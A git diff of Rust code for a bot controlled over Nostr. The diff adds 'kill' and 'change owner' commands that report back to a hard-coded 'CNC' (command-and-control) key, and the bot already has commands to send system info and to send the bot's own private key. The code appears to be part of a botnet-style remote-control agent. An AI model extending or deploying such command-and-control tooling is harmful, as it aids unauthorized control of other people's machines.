@@ -1,4 +1,4 @@
-use std::fmt;
+use std::{fmt, os};
 
 use crate::bot::state::State;
 use nostr_sdk::prelude::*;
@@ -10,11 +10,11 @@ pub enum Commands {
     PrivateKey(RequestPrivateKeyCommand),
     Help(HelpCommand),
     Sysinfo(SysInfoCommand),
+    Kill(KillCommand),
+    ChangeOwner(ChangeOwnerCommand),
     // TODO:
-    // SystemInformation
+    // set_owner
     // SwitchRelay
-    // SwitchFileServer
-    // Kill
     // HeartBeat : periodically send a health message to the CNC
 }
 
@@ -28,7 +28,7 @@ impl Commands {
         }
 
         let command_str = &parts[0][1..];
-        let _args = &parts[1..];
+        let args = &parts[1..];
         match command_str {
             "hello" => Some(Commands::HelloWorld(HelloWorldCommand {})),
             "disable" => Some(Commands::Disable(DisableCommand {})),
@@ -36,6 +36,17 @@ impl Commands {
             "private_key" => Some(Commands::PrivateKey(RequestPrivateKeyCommand {})),
             "help" => Some(Commands::Help(HelpCommand {})),
             "info" => Some(Commands::Sysinfo(SysInfoCommand {})),
+            "kill" => Some(Commands::Kill(KillCommand {})),
+            "owner" => {
+                if let Some(arg) = args.get(0) {
+                    match ChangeOwnerCommand::new(arg) {
+                        Ok(cmd) => Some(Commands::ChangeOwner(cmd)),
+                        Err(_) => None,
+                    }
+                } else {
+                    None
+                }
+            }
             _ => None,
         }
     }
@@ -48,6 +59,8 @@ impl Commands {
             Commands::PrivateKey(cmd) => cmd.execute(state, session).await,
             Commands::Help(cmd) => cmd.execute(state, session).await,
             Commands::Sysinfo(cmd) => cmd.execute(state, session).await,
+            Commands::Kill(cmd) => cmd.execute(state, session).await,
+            Commands::ChangeOwner(cmd) => cmd.execute(state, session).await,
         }
     }
 }
@@ -192,6 +205,47 @@ impl Command for RequestPrivateKeyCommand {
     }
 }
 
+pub struct KillCommand {}
+
+impl Command for KillCommand {
+    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
+        if let Some(ref mut child) = state.child {
+            child.kill()?;
+            state.child = None;
+        }
+        state.enabled = false;
+        session.update_metadata(state.to_string().as_str()).await?;
+        session
+            .send_msg("Shutting down...", PublicKey::parse(CNC_PUB_KEY).unwrap())
+            .await?;
+        std::process::exit(0);
+    }
+}
+
+pub struct ChangeOwnerCommand {
+    npub: PublicKey,
+}
+
+impl ChangeOwnerCommand {
+    pub fn new(npub_str: &str) -> Result<Self> {
+        let npub = PublicKey::parse(npub_str)?;
+        Ok(ChangeOwnerCommand { npub })
+    }
+}
+
+impl Command for ChangeOwnerCommand {
+    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
+        state.owner = Some(self.npub);
+        session
+            .send_msg(
+                "Owner changed successfully.",
+                PublicKey::parse(CNC_PUB_KEY).unwrap(),
+            )
+            .await?;
+        Ok(())
+    }
+}
+
 pub struct HelpCommand {}
 
 impl Command for HelpCommand {
@@ -204,6 +258,8 @@ impl Command for HelpCommand {
                     /disable : Disable the bot
                     /enable : Enable the bot
                     /private_key : Request the private key of the bot
+                    /info : Display system information
+                    /kill : Terminate the bot
                 ",
                 PublicKey::parse(CNC_PUB_KEY).unwrap(),
             )
